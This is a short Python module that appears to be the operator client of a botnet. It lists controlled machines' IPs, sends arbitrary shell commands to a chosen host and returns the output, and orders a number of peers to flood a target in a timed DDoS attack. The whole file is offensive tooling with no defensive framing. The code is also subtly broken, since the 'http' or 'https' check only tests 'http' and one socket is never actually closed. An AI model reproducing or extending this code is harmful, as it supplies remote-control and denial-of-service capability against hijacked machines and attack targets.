from connection import getSock, recvTimeout

def getIpList(session):
    sock = getSock(session)
    sock.send('*'.encode('utf-8'))
    res = recvTimeout(sock, 0.5)
    sock.close()
    return res.split('*')

def getCmdResponse(session, host, cmd):
    assert host 

    if cmd == '':
        return

    sock = getSock(session)
    sock.send('*'.join(['CMD', host, cmd]).encode('utf-8'))
    res = recvTimeout(sock, 2)
    sock.close()
    return res

def sendDdos(session, host, n_peers, time):
    if ('http' or 'https') in host:
        host = host.split('/')[2]

    if host == '':
        return False

    msg = '*'.join(['DDOS', n_peers, time, host])
    sock = getSock(session)
    sock.send(msg.encode('utf-8'))
    sock.close
    return True


